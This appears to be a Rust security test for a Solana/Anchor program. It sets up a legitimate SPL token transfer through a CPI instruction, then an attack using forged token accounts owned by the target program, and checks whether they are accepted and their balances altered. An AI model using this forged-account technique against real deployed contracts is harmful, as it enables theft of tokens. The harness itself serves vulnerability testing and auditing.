let spl_token_id = solana_program::pubkey!("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");

let authority = Pubkey::new_unique();
let source_legit = Pubkey::new_unique();
let dest_legit = Pubkey::new_unique();

// Layout mínimo de uma conta de token SPL: mint (32) + owner (32) + amount (8) + ...
// Para o baseline, basta que as contas existam com dono SPL Token; a CPI de transfer
// falharia por falta de saldo, mas o baseline precisa ter sucesso.
// Portanto, usamos contas com saldo suficiente e mint válido.
// Como não temos o mint real, usamos um mint fictício com dono SPL Token.
let mint = Pubkey::new_unique();
let mut source_data = vec![0u8; 165];
source_data[0..32].copy_from_slice(mint.as_ref());
source_data[32..64].copy_from_slice(authority.as_ref());
source_data[64..72].copy_from_slice(&1000u64.to_le_bytes());
let source_legit_account = account(&spl_token_id, &source_data, None);

let mut dest_data = vec![0u8; 165];
dest_data[0..32].copy_from_slice(mint.as_ref());
dest_data[32..64].copy_from_slice(authority.as_ref());
dest_data[64..72].copy_from_slice(&0u64.to_le_bytes());
let dest_legit_account = account(&spl_token_id, &dest_data, None);

let authority_account = wallet(1_000_000_000);
let token_program_account = program_account(&spl_token_id);

let contas_baseline = vec![
    (source_legit, source_legit_account.clone()),
    (dest_legit, dest_legit_account.clone()),
    (authority, authority_account.clone()),
    (spl_token_id, token_program_account.clone()),
];

let ix_baseline = env.anchor_ix(
    "cpi",
    &(100u64,),
    vec![
        AccountMeta::new(source_legit, false),
        AccountMeta::new(dest_legit, false),
        AccountMeta::new_readonly(authority, true),
        AccountMeta::new_readonly(spl_token_id, false),
    ],
);

let r_baseline = env.baseline("transferência legítima via CPI", &ix_baseline, &contas_baseline);

// Ataque: substituir source e destination por contas forjadas com dono diferente
let attacker_owner = env.program_id; // dono forjado: o próprio programa-alvo
let source_forged = Pubkey::new_unique();
let dest_forged = Pubkey::new_unique();

let mut source_forged_data = vec![0u8; 165];
source_forged_data[0..32].copy_from_slice(mint.as_ref());
source_forged_data[32..64].copy_from_slice(authority.as_ref());
source_forged_data[64..72].copy_from_slice(&1000u64.to_le_bytes());
let source_forged_account = account(&attacker_owner, &source_forged_data, None);

let mut dest_forged_data = vec![0u8; 165];
dest_forged_data[0..32].copy_from_slice(mint.as_ref());
dest_forged_data[32..64].copy_from_slice(authority.as_ref());
dest_forged_data[64..72].copy_from_slice(&0u64.to_le_bytes());
let dest_forged_account = account(&attacker_owner, &dest_forged_data, None);

let contas_ataque = vec![
    (source_forged, source_forged_account.clone()),
    (dest_forged, dest_forged_account.clone()),
    (authority, authority_account.clone()),
    (spl_token_id, token_program_account.clone()),
];

let ix_ataque = env.anchor_ix(
    "cpi",
    &(100u64,),
    vec![
        AccountMeta::new(source_forged, false),
        AccountMeta::new(dest_forged, false),
        AccountMeta::new_readonly(authority, true),
        AccountMeta::new_readonly(spl_token_id, false),
    ],
);

let r_ataque = env.attack("CPI com contas forjadas de dono diferente", &ix_ataque, &contas_ataque);

if r_ataque.program_result == ProgramResult::Success {
    // O dano: a conta forjada foi aceita e usada; seu dono permanece diferente do SPL Token
    let source_after = after(&r_ataque, &source_forged);
    let dest_after = after(&r_ataque, &dest_forged);
    env.effect(
        "conta forjada aceita com dono diferente do SPL Token",
        source_after.owner() != &spl_token_id || dest_after.owner() != &spl_token_id,
    );
    env.effect(
        "saldo da conta forjada foi alterado pela CPI",
        read_u64(source_after.data(), 64) != 1000u64 || read_u64(dest_after.data(), 64) != 0u64,
    );
}"
